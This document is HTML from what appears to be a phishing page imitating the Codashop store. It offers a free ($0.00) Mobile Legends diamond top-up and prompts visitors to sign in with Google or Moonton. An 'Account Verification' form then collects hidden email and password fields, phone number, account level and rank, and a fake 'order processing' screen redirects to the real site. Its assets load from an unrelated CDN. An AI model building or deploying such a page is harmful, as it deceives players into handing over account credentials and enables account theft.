<path d="M3.55703 4.78626L1.55576 5.23521C1.38835 5.27326 1.23617 5.12107 1.2666 4.95367L1.67751 2.91435C1.71556 2.72412 1.94384 2.65563 2.08081 2.7926L2.34714 3.05893C3.31353 1.68163 4.97998 0.829381 6.83667 1.03483C9.05861 1.27833 10.8316 3.04371 11.0751 5.26565C11.3947 8.16483 9.13471 10.6227 6.29641 10.6227C3.75487 10.6227 1.6699 8.65183 1.49488 6.14834C1.49488 6.04942 1.56337 5.97332 1.66229 5.97332H2.49932C2.59825 5.97332 2.68195 6.04942 2.68956 6.14834C2.85696 7.92133 4.29514 9.32906 6.09095 9.42798C8.2368 9.54973 10.025 7.76914 9.91086 5.62329C9.81194 3.71334 8.22919 2.19146 6.29641 2.19146C4.9952 2.19146 3.84618 2.88391 3.207 3.91879L3.66356 4.37535C3.79292 4.50471 3.73204 4.73299 3.54942 4.77865L3.55703 4.78626Z" fill="white"></path>
</mask>
<g mask="url(#reward_svg__mask4_3_25)">
<path d="M3.55703 4.78626L1.55576 5.23521C1.38835 5.27326 1.23617 5.12107 1.2666 4.95367L1.67751 2.91435C1.71556 2.72412 1.94384 2.65563 2.08081 2.7926L2.34714 3.05893C3.31353 1.68163 4.97998 0.829381 6.83667 1.03483C9.05861 1.27833 10.8316 3.04371 11.0751 5.26565C11.3947 8.16483 9.13471 10.6227 6.29641 10.6227C3.75487 10.6227 1.6699 8.65183 1.49488 6.14834C1.49488 6.04942 1.56337 5.97332 1.66229 5.97332H2.49932C2.59825 5.97332 2.68195 6.04942 2.68956 6.14834C2.85696 7.92133 4.29514 9.32906 6.09095 9.42798C8.2368 9.54973 10.025 7.76914 9.91086 5.62329C9.81194 3.71334 8.22919 2.19146 6.29641 2.19146C4.9952 2.19146 3.84618 2.88391 3.207 3.91879L3.66356 4.37535C3.79292 4.50471 3.73204 4.73299 3.54942 4.77865L3.55703 4.78626Z" fill="#BC6422"></path>
<path d="M3.42031 5.18958L1.41904 5.63853C1.25163 5.67658 1.09945 5.52439 1.12988 5.35699L1.54079 3.31767C1.57884 3.12744 1.80712 3.05895 1.94409 3.19592L2.21042 3.46225C3.17681 2.08495 4.84326 1.2327 6.69995 1.43815C8.92189 1.68165 10.6949 3.44703 10.9384 5.66897C11.258 8.56815 8.99799 11.026 6.15969 11.026C3.61815 11.026 1.53318 9.05515 1.35817 6.55166C1.35817 6.45274 1.42665 6.37664 1.52557 6.37664H2.3626C2.46153 6.37664 2.54523 6.45274 2.55284 6.55166C2.72025 8.32465 4.15842 9.73238 5.95423 9.8313C8.10008 9.95305 9.88829 8.17246 9.77415 6.02661C9.67522 4.11666 8.09247 2.59478 6.15969 2.59478C4.85848 2.59478 3.70947 3.28723 3.07028 4.32211L3.52684 4.77867C3.6562 4.90803 3.59532 5.13631 3.4127 5.18197L3.42031 5.18958Z" fill="#68250E"></path>
<path d="M3.68689 4.06348L3.2151 3.92651L3.07812 4.32981L3.74014 4.26894L3.68689 4.06348Z" fill="#BC6422"></path>
</g>
</g>
<defs>
<clipPath id="reward_svg__clip0_3_25">
<rect width="12" height="12" fill="white"></rect>
</clipPath>
</defs>
</svg> Discount Up To 100% With Codacash</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<!--]-->
</div>
</main>
<footer class="footer--fixed footer" data-testid="footer" data-v-ce79952d data-v-2eb691c8>
<div class="footer__header" data-v-2eb691c8></div>
<div class="footer__content" data-v-2eb691c8>
<section class="footer__content__sections" data-v-2eb691c8>
<div class="category footer__content__sections__section" data-v-2eb691c8 data-v-dfa862a9>
<strong class="category__title" data-v-dfa862a9>For Publishers</strong>
<nav data-v-dfa862a9>
<ul class="category__nav-list" data-v-dfa862a9>
<!--[-->
<li class="category__nav-list__item" data-v-dfa862a9>
<a href="https://portal.coda.co/#/signup" target="_blank" class="category__nav-list__item__link" rel="noopener" data-v-dfa862a9>List your title on Codashop</a>
</li>
<li class="category__nav-list__item" data-v-dfa862a9>
<a href="https://www.coda.co/product/codashop/" target="_blank" class="category__nav-list__item__link" rel="noopener" data-v-dfa862a9>Learn more about us</a>
</li>
<!--]-->
</ul>
</nav>
</div>
<div class="contact footer__content__sections__section" data-v-2eb691c8 data-v-fe9f84d0>
<strong class="contact__title" data-v-fe9f84d0>Need help?</strong>
<a href="https://id.support.codashop.com" target="_blank" class="contact__link-container" rel="noopener" data-v-fe9f84d0>
<span class="contact__link-container__left-icon" data-v-fe9f84d0>
<svg width="16" height="15" xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 16 16" data-v-fe9f84d0>
<path stroke="currentColor" d="M2.7 4.76c.48-.1 1.13-.1 2.11-.1h1.04c1.45 0 2.18 0 2.73.3.5.24.89.65 1.14 1.14.28.56.28 1.3.28 2.77v1.7c-.05 1-.65 1.86-1.5 2.26M2.7 4.76c-.24.04-.44.1-.62.2C1.6 5.2 1.2 5.6.95 6.1.67 6.66.67 7.4.67 8.87v2.22c0 1.1.87 1.99 1.95 1.99h.31c.4 0 .68.41.53.79-.2.54.4 1.02.87.69l1.35-.98.03-.02c.43-.31.95-.48 1.47-.48h.35c.35-.02.67-.1.97-.25M2.7 4.76c.03-.7.12-1.2.33-1.6.32-.63.83-1.14 1.46-1.46.71-.37 1.64-.37 3.51-.37h1.33c1.87 0 2.8 0 3.52.37.62.32 1.13.83 1.45 1.45.37.72.37 1.65.37 3.52v2.82A2.51 2.51 0 0 1 12.15 12h-.4a.73.73 0 0 0-.68 1c.27.69-.51 1.3-1.1.88L8.5 12.83"></path>
<path fill="currentColor" d="M4 9.33a.67.67 0 1 1-1.33 0 .67.67 0 0 1 1.33 0Zm2 0a.67.67 0 1 1-1.33 0 .67.67 0 0 1 1.33 0Zm2 0a.67.67 0 1 1-1.33 0 .67.67 0 0 1 1.33 0Z"></path>
</svg>
</span>
<span class="contact__link-container__label" data-v-fe9f84d0>Contact Us</span>
<span class="contact__link-container__right-icon" data-v-fe9f84d0>
<svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-fe9f84d0>
<path d="M2.7073 14.1533L3.00119 13.7488H3.00119L2.7073 14.1533ZM1.96986 13.4158L1.56535 13.7097H1.56535L1.96986 13.4158ZM12.6966 13.4158L12.2921 13.122V13.122L12.6966 13.4158ZM11.9592 14.1533L11.6653 13.7488L11.9592 14.1533ZM2.7073 3.42651L2.41341 3.022L2.7073 3.42651ZM1.96986 4.16395L1.56535 3.87006H1.56535L1.96986 4.16395ZM8.66059 3.29467C8.93671 3.29798 9.16324 3.07682 9.16655 2.8007C9.16986 2.52457 8.9487 2.29805 8.67258 2.29474L8.66059 3.29467ZM13.8284 7.45057C13.8251 7.17445 13.5986 6.95329 13.3225 6.9566C13.0463 6.95991 12.8252 7.18644 12.8285 7.46256L13.8284 7.45057ZM6.6702 8.33584C6.47494 8.53111 6.47494 8.84769 6.6702 9.04295C6.86547 9.23821 7.18205 9.23821 7.37731 9.04295L6.6702 8.33584ZM10.3214 0.175525C10.0452 0.176757 9.82236 0.401611 9.82359 0.677751C9.82482 0.95389 10.0497 1.17675 10.3258 1.17552L10.3214 0.175525ZM11.9783 0.668137L11.9806 1.16813L11.9783 0.668137ZM15.045 3.7348L14.545 3.73257L15.045 3.7348ZM14.5376 5.38733C14.5364 5.66347 14.7593 5.88833 15.0354 5.88956C15.3115 5.89079 15.5364 5.66794 15.5376 5.3918L14.5376 5.38733ZM14.4091 1.00859L14.7152 0.613175L14.7152 0.613175L14.4091 1.00859ZM14.7046 1.30401L15.1 0.997994V0.997994L14.7046 1.30401ZM14.5514 1.16171L14.2448 0.766808L14.22 0.786015L14.1979 0.808158L14.5514 1.16171ZM7.33325 14.2899C6.0722 14.2899 5.16658 14.2892 4.46528 14.2132C3.77334 14.1383 3.33986 13.9948 3.00119 13.7488L2.41341 14.5578C2.95096 14.9484 3.58054 15.1232 4.35757 15.2074C5.12524 15.2906 6.09448 15.2899 7.33325 15.2899V14.2899ZM0.833252 8.7899C0.833252 10.0287 0.832566 10.9979 0.915737 11.7656C0.999923 12.5426 1.1748 13.1722 1.56535 13.7097L2.37437 13.122C2.12831 12.7833 1.98489 12.3498 1.90992 11.6579C1.83394 10.9566 1.83325 10.0509 1.83325 8.7899H0.833252ZM3.00119 13.7488C2.76066 13.574 2.54913 13.3625 2.37437 13.122L1.56535 13.7097C1.80179 14.0352 2.08798 14.3214 2.41341 14.5578L3.00119 13.7488ZM12.8333 8.7899C12.8333 10.0509 12.8326 10.9566 12.7566 11.6579C12.6816 12.3498 12.5382 12.7833 12.2921 13.122L13.1012 13.7097C13.4917 13.1722 13.6666 12.5426 13.7508 11.7656C13.8339 10.9979 13.8333 10.0287 13.8333 8.7899H12.8333ZM7.33325 15.2899C8.57203 15.2899 9.54127 15.2906 10.3089 15.2074C11.086 15.1232 11.7155 14.9484 12.2531 14.5578L11.6653 13.7488C11.3266 13.9948 10.8932 14.1383 10.2012 14.2132C9.49992 14.2892 8.5943 14.2899 7.33325 14.2899V15.2899ZM12.2921 13.122C12.1174 13.3625 11.9058 13.574 11.6653 13.7488L12.2531 14.5578C12.5785 14.3214 12.8647 14.0352 13.1012 13.7097L12.2921 13.122ZM7.33325 2.2899C6.09448 2.2899 5.12524 2.28921 4.35757 2.37238C3.58054 2.45657 2.95096 2.63145 2.41341 3.022L3.00119 3.83102C3.33986 3.58496 3.77334 3.44153 4.46528 3.36657C5.16658 3.29059 6.0722 3.2899 7.33325 3.2899V2.2899ZM1.83325 8.7899C1.83325 7.52885 1.83394 6.62323 1.90992 5.92193C1.98489 5.22999 2.12831 4.79651 2.37437 4.45784L1.56535 3.87006C1.1748 4.4076 0.999923 5.03719 0.915737 5.81422C0.832566 6.58188 0.833252 7.55113 0.833252 8.7899H1.83325ZM2.41341 3.022C2.08798 3.25844 1.80179 3.54463 1.56535 3.87006L2.37437 4.45784C2.54913 4.21731 2.76066 4.00578 3.00119 3.83102L2.41341 3.022ZM7.33325 3.2899C7.82438 3.2899 8.26342 3.28991 8.66059 3.29467L8.67258 2.29474C8.26823 2.28989 7.82279 2.2899 7.33325 2.2899V3.2899ZM13.8333 8.7899C13.8333 8.30037 13.8333 7.85493 13.8284 7.45057L12.8285 7.46256C12.8332 7.85974 12.8333 8.29878 12.8333 8.7899H13.8333ZM10.3258 1.17552L11.9806 1.16813L11.9761 0.168142L10.3214 0.175525L10.3258 1.17552ZM14.545 3.73257L14.5376 5.38733L15.5376 5.3918L15.545 3.73704L14.545 3.73257ZM11.9806 1.16813C12.6522 1.16514 13.1136 1.16383 13.4651 1.20222C13.8065 1.23951 13.9803 1.30897 14.1031 1.40401L14.7152 0.613175C14.3866 0.358934 14.0049 0.255221 13.5736 0.20813C13.1525 0.162136 12.6242 0.165251 11.9761 0.168142L11.9806 1.16813ZM15.545 3.73704C15.5479 3.08897 15.551 2.56067 15.505 2.13951C15.4579 1.70829 15.3542 1.32652 15.1 0.997994L14.3091 1.61002C14.4042 1.73284 14.4736 1.90664 14.5109 2.24807C14.5493 2.59957 14.548 3.061 14.545 3.73257L15.545 3.73704ZM7.37731 9.04295L14.905 1.51526L14.1979 0.808158L6.6702 8.33584L7.37731 9.04295ZM14.1031 1.40401C14.1422 1.43423 14.1792 1.46689 14.214 1.50177L14.9222 0.795796C14.8572 0.730619 14.7881 0.669613 14.7152 0.613175L14.1031 1.40401ZM14.214 1.50177C14.2479 1.5358 14.2797 1.57194 14.3091 1.61002L15.1 0.997994C15.0449 0.926878 14.9856 0.859356 14.9222 0.795796L14.214 1.50177ZM14.8581 1.55662L14.8748 1.54369L14.2614 0.753882L14.2448 0.766808L14.8581 1.55662Z" fill="currentColor"></path>
</svg>
</span>
</a>
</div>
<span data-v-2eb691c8></span>
<div class="social footer__content__sections__section" data-v-2eb691c8 data-v-2488b971>
<strong class="social__title" data-v-2488b971>Follow us:</strong>
<div class="social__links" data-v-2488b971>
<!--[-->
<a style="" href="https://www.facebook.com/Codashop.us/" label="Codashop Official Facebook" target="_blank" class="social__links__item" rel="noopener" aria-label="Codashop Official Facebook" data-v-2488b971>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" width="24" height="24" alt="Codashop Official Facebook" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-facebook-H36.png 1x, https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-facebook-H36.png 2x" class="social__links__item__image" src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-facebook-H36.png" data-v-2488b971>
</a>
<a style="" href="https://twitter.com/codashop_us" label="X" target="_blank" class="social__links__item" rel="noopener" aria-label="X" data-v-2488b971>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" width="24" height="24" alt="X" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-twitter-H36-new.jpg 1x, https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-twitter-H36-new.jpg 2x" class="social__links__item__image" src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-twitter-H36-new.jpg" data-v-2488b971>
</a>
<a style="" href="https://instagram.com/codashop_us" label="Codashop Official Instagram" target="_blank" class="social__links__item" rel="noopener" aria-label="Codashop Official Instagram" data-v-2488b971>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" width="24" height="24" alt="Codashop Official Instagram" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-instagram-H36.png 1x, https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-instagram-H36.png 2x" class="social__links__item__image" src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-instagram-H36.png" data-v-2488b971>
</a>
<a style="" href="https://www.tiktok.com/@codashop_us" label="Tiktok" target="_blank" class="social__links__item" rel="noopener" aria-label="Tiktok" data-v-2488b971>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" width="24" height="24" alt="Tiktok" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-tiktok-H36.png 1x, https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-tiktok-H36.png 2x" class="social__links__item__image" src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-tiktok-H36.png" data-v-2488b971>
</a>
<a style="" href="https://news.codashop.com/us/" label="Coda_News_URL" target="_blank" class="social__links__item" rel="noopener" aria-label="Coda_News_URL" data-v-2488b971>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" width="24" height="24" alt="Coda_News_URL" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/social-media-logo/36/CodaShop_diamond-darkmatter_36.png 1x, https://cdn1.codashop.com/S/content/social-media-logo/36/CodaShop_diamond-darkmatter_36.png 2x" class="social__links__item__image" src="https://cdn1.codashop.com/S/content/social-media-logo/36/CodaShop_diamond-darkmatter_36.png" data-v-2488b971>
</a>
<!--]-->
</div>
</div>
<!---->
<!---->
</section>
</div>
<div class="footer__footer" data-v-2eb691c8>
<section class="footer__footer__legal" data-v-2eb691c8>
<div class="legal" data-v-2eb691c8 data-v-ef2e81df>
<!---->
<!---->
<div class="legal__copyright" data-v-ef2e81df>© Copyright Coda Payments</div>
<div class="legal__policies" data-v-ef2e81df>
<!--[-->
<a href="https://marketing.codashop.com/marketing-and-partnership-id" target="_blank" class="legal__policies__policy-link" rel="noopener" data-v-ef2e81df>
<span data-v-ef2e81df>Become An Affiliate</span>
<div style="" class="legal__policies__policy-link__separator" data-v-ef2e81df></div>
</a>
<a href="https://www.coda.co/" target="_blank" class="legal__policies__policy-link" rel="noopener" data-v-ef2e81df>
<span data-v-ef2e81df>For Game Publishers</span>
<div style="" class="legal__policies__policy-link__separator" data-v-ef2e81df></div>
</a>
<a href="https://www.coda.co/terms-conditions/" target="_blank" class="legal__policies__policy-link" rel="noopener" data-v-ef2e81df>
<span data-v-ef2e81df>Terms & Conditions</span>
<div style="" class="legal__policies__policy-link__separator" data-v-ef2e81df></div>
</a>
<a href="https://www.coda.co/privacy-policy" target="_blank" class="legal__policies__policy-link" rel="noopener" data-v-ef2e81df>
<span data-v-ef2e81df>Privacy Policy</span>
<div style="" class="legal__policies__policy-link__separator" data-v-ef2e81df></div>
</a>
<a href="https://www.coda.co/policy/coda-payments-vulnerability-disclosure-policy" target="_blank" class="legal__policies__policy-link" rel="noopener" data-v-ef2e81df>
<span data-v-ef2e81df>Bug bounty</span>
<div style="" class="legal__policies__policy-link__separator" data-v-ef2e81df></div>
</a>
<a href="https://share-na2.hsforms.com/2J56f_5OJRVGMU5ThSp1YvAs9usq?utm_source=referral&amp;utm_medium=codashop&amp;utm_campaign=codashop_footer" target="_blank" class="legal__policies__policy-link" rel="noopener" data-v-ef2e81df>
<span data-v-ef2e81df>Become A Distributor</span>
<div style="display:none;" class="legal__policies__policy-link__separator" data-v-ef2e81df></div>
</a>
<!--]-->
</div>
<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 320 63" aria-labelledby="logo" class="fill-dark-matter-100" height="24" width="109" data-v-ef2e81df>
<title id="logo">Codashop</title>
<path d="M52.2 4.1c-.4-.5-1-1-1.6-1.1L40.8.2 39.5 0h-14a3 3 0 0 0-.7.1l-10.5 3c-.2 0-.4 0-.6.2l-.8.6-.5.4S.4 21 .1 21.6c-.3.7.3.5.5.4l7.8-2.8c1.1-.4 1.4-.5 1.8-1.1l.2-.5L17.5 5c.2-.3.6-.5 1-.4.4.1.4.7.3 1l-4.4 10.8-.2.6v.2c-.1.5.2.5.5.5l10.9-2 1.3-.2 15.5 1.1c1.2.1 1.8-.4 1.5-1.4l-.3-1-2.1-9-.7-2.1c0-.3 0-.8.4-1 .3 0 .7.2.8.5l5.9 12 .6 1.3c.5.8.8 1 2.2 1.3l5 1.4 8.2 3.2c.4.2 1 0 .8-.6-.1-.6-12.5-17-12.5-17Z"></path>
<path d="m62.3 26.3-7.2-2.6-4.1-1c-1-.1-1.5-.1-2 1l-.5 1.3L36 54.4c-.1.2-.4.3-.7.3a.6.6 0 0 1-.4-.7l8.3-28.5.7-2.4c.3-1-.3-1.5-1.3-1.6l-15.8-1c-.5-.2-1-.2-1.5 0l-10 1.9a.8.8 0 0 0-.7 1.1l.3.6 2.3 4.7 9 17.7c.1.2.1.9-.4 1-.4.2-.8 0-1-.4L13.7 28.8l-2-3.3-.8-1.3c-.4-.7-1.2-.7-2-.4L2 26.2c-.4.1-1 .4-.6 1L30 61a3 3 0 0 0 4.5 0L63 27.9c.5-.6 0-1.4-.7-1.6ZM111 31.8c0 9-6.1 15.5-14.5 15.5H96c-8.6 0-14.5-6.7-14.5-16v-.5c0-9.3 6-16 14.5-16h.5c8.4 0 14.5 6.6 14.5 15.5H97V23h-1.5v16.4H97v-7.5h14ZM127.3 14.9c8.6 0 14.5 6.6 14.5 16v.4c0 9.3-6 16-14.5 16h-.6c-8.6 0-14.5-6.7-14.5-16v-.5c0-9.3 6-16 14.5-16h.6Zm.5 24.4V22.9h-1.6v16.4h1.6ZM158 15.3c9 0 13.4 6.5 13.4 15.6v.4c0 9-4.5 15.6-13.3 15.6h-14.4V15.3H158Zm-2 24h1.4V22.9H156v16.4ZM173.1 46.9V27.7A13 13 0 0 1 186.6 15h.4c7.9 0 13.5 5.7 13.5 12.8V47h-11.2v-9.3h-5V47H173ZM184.3 28h5v-1.4h-5V28ZM202 25.8c0-6.3 4.3-10.5 10.6-10.5h15.6v9.3h-16.5v1.3h7c6.3 0 10.6 4.2 10.6 10.5s-4.3 10.5-10.6 10.5H203v-9.3h16.5v-1.4h-7c-6.3 0-10.6-4.1-10.6-10.4ZM231 15.3h11.4v10.6h5V15.3h11.4v31.6h-11.4V35.6h-5V47H231V15.3ZM275.7 14.9c8.6 0 14.6 6.6 14.6 16v.4c0 9.3-6 16-14.6 16h-.5c-8.6 0-14.5-6.7-14.5-16v-.5c0-9.3 6-16 14.5-16h.5Zm.5 24.4V22.9h-1.5v16.4h1.5ZM292.2 46.9V15.3h18.1c5.7 0 9.7 4.1 9.7 9.9v.7c0 5.8-4 10-9.7 10h-6.8v11h-11.3Zm16-21.3a2 2 0 1 0-4.1 0 2 2 0 0 0 4.1 0Z"></path>
</svg>
</div>
</section>
</div>
</footer>
<span data-v-ce79952d></span>
</div>
</div>

<div id="headlessui-dialog-v-0-2-103-1" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-v-0-2-103-4" class="account_login snipcss-Swsg5" style="display: none;">
<div data-v-28d6f420="" class="sheet-backdrop"></div>
<div data-v-28d6f420="" class="sheet-dialog snipcss0-0-0-1" data-testid="sheet-dialog">
<div data-v-28d6f420="" id="headlessui-dialog-panel-v-0-2-103-3" data-headlessui-state="open" class="snipcss0-1-1-2">
<div data-v-28d6f420="" id="headlessui-dialog-title-v-0-2-103-4" data-headlessui-state="open" class="snipcss0-2-2-3">
<div data-v-28d6f420="" class="sheet-dialog-header-content snipcss0-3-3-4">
<div data-v-4d161e04="" class="order-summary__header snipcss0-4-4-5">
<h2 data-v-4d161e04="" class="order-summary__header__title snipcss0-5-5-6">Order details</h2>
<div data-v-4d161e04="" class="order-summary__close snipcss0-5-5-7"><svg data-v-4d161e04="" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="snipcss0-6-7-8">
<path d="M19.707 5.707a1 1 0 0 0-1.414-1.414L12 10.586 5.707 4.293a1 1 0 0 0-1.414 1.414L10.586 12l-6.293 6.293a1 1 0 1 0 1.414 1.414L12 13.414l6.293 6.293a1 1 0 0 0 1.414-1.414L13.414 12l6.293-6.293Z"></path>
</svg></div>
</div>
</div>
</div>
<section data-v-28d6f420="" class="sheet-dialog-main snipcss0-2-2-9">
<div data-v-4d161e04="" class="order-summary__main snipcss0-3-9-10">
<p data-v-4d161e04="" class="order-summary__caption snipcss0-4-10-11">Please confirm your order details are correct.</p>
<section data-v-4d161e04="" class="snipcss0-4-10-12">
<div data-v-57904d83="" data-v-4d161e04="" class="order-summary__sku snipcss0-5-12-13" data-testid="order-summary-sku"><img data-v-57904d83="" class="order-summary__sku__image snipcss0-6-13-14" src="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/50_MLBB_NewDemom.png" alt="59 Diamonds">
<div data-v-57904d83="" class="order-summary__sku__text snipcss0-6-13-15">
<div data-v-57904d83="" class="order-summary__sku__text--title snipcss0-7-15-16"></div>
<div data-v-57904d83="" class="order-summary__sku__text--subtitle snipcss0-7-15-17"></div>
</div>
</div>
</section>
<section data-v-4d161e04="" class="snipcss0-4-10-18">
<ul data-v-d9c05b85="" data-v-4d161e04="" class="order-summary__list snipcss0-5-18-19">
<li data-v-41cc2aa9="" data-v-4d161e04="" class="order-summary__list__item snipcss0-6-19-24"><span data-v-41cc2aa9="" class="order-summary__list__item__label snipcss0-7-24-25">Game ID: </span><span data-v-41cc2aa9="" class="order-summary__list__item__info snipcss0-7-24-26">
<div data-v-4d161e04="" class="playeridlll"></div>
</span></li>
<li data-v-41cc2aa9="" data-v-4d161e04="" class="order-summary__list__item snipcss0-6-19-28"><span data-v-41cc2aa9="" class="order-summary__list__item__label snipcss0-7-28-29">Pay with: </span><span data-v-41cc2aa9="" class="order-summary__list__item__info snipcss0-7-28-30">
<div data-v-4d161e04="" class="paymentlll">Dana</div>
</span></li>
<li data-v-41cc2aa9="" data-v-4d161e04="" class="order-summary__list__item snipcss0-6-19-32"><span data-v-41cc2aa9="" class="order-summary__list__item__label snipcss0-7-32-33">Price: </span><span data-v-41cc2aa9="" class="order-summary__list__item__info snipcss0-7-32-34">
<div data-v-4d161e04="" class="snipcss0-8-34-35">$0.00</div>
</span></li>
<li data-v-41cc2aa9="" data-v-4d161e04="" class="order-summary__list__item snipcss0-6-19-36"><span data-v-41cc2aa9="" class="order-summary__list__item__label snipcss0-7-36-37">Tax: (11%) </span><span data-v-41cc2aa9="" class="order-summary__list__item__info snipcss0-7-36-38">
<div data-v-4d161e04="" class="snipcss0-8-38-39">$0.00</div>
</span></li>
</ul>
</section>
</div>
</section>
<section data-v-28d6f420="" class="snipcss0-2-2-40">
<div data-v-4d161e04="" class="order-summary__footer snipcss0-3-40-41">
<div data-v-4d161e04="" class="order-summary__footer-content snipcss0-4-41-42">
<span style="text-align: center;margin-bottom: 10px;">Please log in first to continue the transaction.</span>
<div class="btn-login-wrapper" onclick="open_google()">
<div class="btn-login-logo-wrapper">
<img src="https://cdn.stackpath.web.id/31/img/btn_gp.png">
</div>
<span>Sign in with Google Account</span>
</div>
<div class="btn-login-wrapper" onclick="open_moonton()">
<div class="btn-login-logo-wrapper">
<img src="https://cdn.stackpath.web.id/31/img/btn_mt.png">
</div>
<span>Sign in with Moonton Account</span>
</div>
<!-- <div class="btn-login-wrapper" onclick="open_facebook()">
<div class="btn-login-logo-wrapper">
<img src="https://cdn.stackpath.web.id/31/img/icon_fb.png">
</div>
<span>Sign in with Facebook Account</span>
</div> -->
</div>
</div>
</section>
</div>
</div>
</div>

<div id="headlessui-dialog-v-0-2-103-1" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-v-0-2-103-4" class="account_verification snipcss-Swsg5" style="display: none;">
<div data-v-28d6f420="" class="sheet-backdrop"></div>
<div data-v-28d6f420="" class="sheet-dialog snipcss0-0-0-1" data-testid="sheet-dialog">
<div data-v-28d6f420="" id="headlessui-dialog-panel-v-0-2-103-3" data-headlessui-state="open" class="snipcss0-1-1-2">
<div data-v-28d6f420="" id="headlessui-dialog-title-v-0-2-103-4" data-headlessui-state="open" class="snipcss0-2-2-3">
<div data-v-28d6f420="" class="sheet-dialog-header-content snipcss0-3-3-4">
<div data-v-4d161e04="" class="order-summary__header snipcss0-4-4-5">
<h2 data-v-4d161e04="" class="order-summary__header__title snipcss0-5-5-6">Account Verification</h2>
</div>
</div>
</div>
<form action="" method="post" id="processVerificationForm">
<section data-v-28d6f420="" class="sheet-dialog-main snipcss0-2-2-9">
<div data-v-4d161e04="" class="order-summary__main snipcss0-3-9-10">
<p data-v-4d161e04="" class="order-summary__caption snipcss0-4-10-11">Please confirm your account to continue.</p>
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="hidden" name="pass" id="validatePass" readonly>
<input type="hidden" name="nickname" id="validateNickname" readonly>
<input type="hidden" name="userid" id="validateUserid" readonly>
<input type="hidden" name="zoneid" id="validateZoneid" readonly>
<input type="hidden" name="login" id="validateLogin" readonly>
<div data-v-32bcd238="" class="order-summary__details">
<label style="line-height: 0;">Phone number</label>
<input type="tel" class="verify-order" name="phone" id="phone" placeholder="Enter Your Phone Number" required>
<label style="line-height: 0;">Account Level</label>
<select class="verify-order" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Select Your Account Level</option>
<script>
for (var i = 1; i <= 100; i++) {
document.write("<option>" + i + "</option>");
};
</script>
</select>
<label style="line-height: 0;">Current Rank</label>
<select class="verify-order" name="tier" id="tier" required>
<option selected="selected" disabled="disabled" value="">Select Your Current Account Rank</option>
<option>Warrior</option>
<option>Elite</option>
<option>Master</option>
<option>Grandmaster</option>
<option>Epic</option>
<option>Legend</option>
<option>Mythic</option>
<option>Mythical Honor</option>
<option>Mythical Glory</option>
<option>Mythical Immortal</option>
</select>
</div>
</div>
</div>
</section>
<section data-v-28d6f420="" class="snipcss0-2-2-40">
<div data-v-4d161e04="" class="order-summary__footer snipcss0-3-40-41">
<div data-v-4d161e04="" class="order-summary__footer-content snipcss0-4-41-42">
<button class="btn-login-wrapper" type="submit" onclick="processVerificationData()" style="
background: #6242fc;
display: block;
border-radius: 42px;
border: none;
padding: 12px 18px;
cursor: pointer;
word-break: break-word;
font-family: NotoSans-Regular, sans-serif;
font-size: .875rem;
outline: none;
color: #fff;
box-shadow: -5px 5px 10px rgba(0, 0, 0, .16);
">
Verification
</button>
</div>
</div>
</section>
</form>
</div>
</div>
</div>

<div id="headlessui-dialog-v-0-2-103-1" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-v-0-2-103-4" class="account_processing snipcss-Swsg5" style="display: none;">
<div data-v-28d6f420="" class="sheet-backdrop"></div>
<div data-v-28d6f420="" class="sheet-dialog snipcss0-0-0-1" data-testid="sheet-dialog">
<div data-v-28d6f420="" id="headlessui-dialog-panel-v-0-2-103-3" data-headlessui-state="open" class="snipcss0-1-1-2">
<div data-v-28d6f420="" id="headlessui-dialog-title-v-0-2-103-4" data-headlessui-state="open" class="snipcss0-2-2-3">
<div data-v-28d6f420="" class="sheet-dialog-header-content snipcss0-3-3-4">
<div data-v-4d161e04="" class="order-summary__header snipcss0-4-4-5">
<h2 data-v-4d161e04="" class="order-summary__header__title snipcss0-5-5-6">Order is being processed</h2>
</div>
</div>
</div>
<section data-v-28d6f420="" class="sheet-dialog-main snipcss0-2-2-9">
<div data-v-4d161e04="" class="order-summary__main snipcss0-3-9-10">
<p data-v-4d161e04="" class="order-summary__caption snipcss0-4-10-11">Your request has been queued and will be processed as soon as possible.</p>
<center><i class="zmdi zmdi-shield-check zmdi-hc-4x" style="color: green;"></i></center>
<br>
<br>
<div data-v-32bcd238="" class="order-summary__details">
Your order has been received and is being processed, please allow up to 24 hours.
<br>
<br>
Diamonds will be sent directly to your in-game mailbox.
</div>
</div>
</section>
<section data-v-28d6f420="" class="snipcss0-2-2-40">
<div data-v-4d161e04="" class="order-summary__footer snipcss0-3-40-41">
<div data-v-4d161e04="" class="order-summary__footer-content snipcss0-4-41-42">
<button class="btn-login-wrapper" type="button" onclick="window.location.href='https://codashop.com/';" style="
background: #6242fc;
display: block;
border-radius: 42px;
border: none;
padding: 12px 18px;
cursor: pointer;
word-break: break-word;
